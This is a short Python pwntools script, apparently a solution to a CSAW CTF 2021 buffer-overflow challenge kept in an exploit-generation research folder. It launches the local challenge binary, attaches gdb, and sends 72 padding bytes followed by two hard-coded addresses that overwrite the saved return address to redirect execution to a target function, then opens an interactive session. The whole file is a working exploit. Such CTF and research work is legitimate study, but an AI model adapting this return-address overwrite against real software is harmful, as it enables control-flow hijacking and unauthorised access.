from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/2_csawctf2021_password/csawctf2021_password")
pwn.gdb.attach(p)
p.recvuntil(b'Enter the password to get in: \n>')
payload = b"\x00" * 72
payload += p64(0x401016) + p64(0x401172)
payload += b"\n"
p.send(payload)
p.interactive()
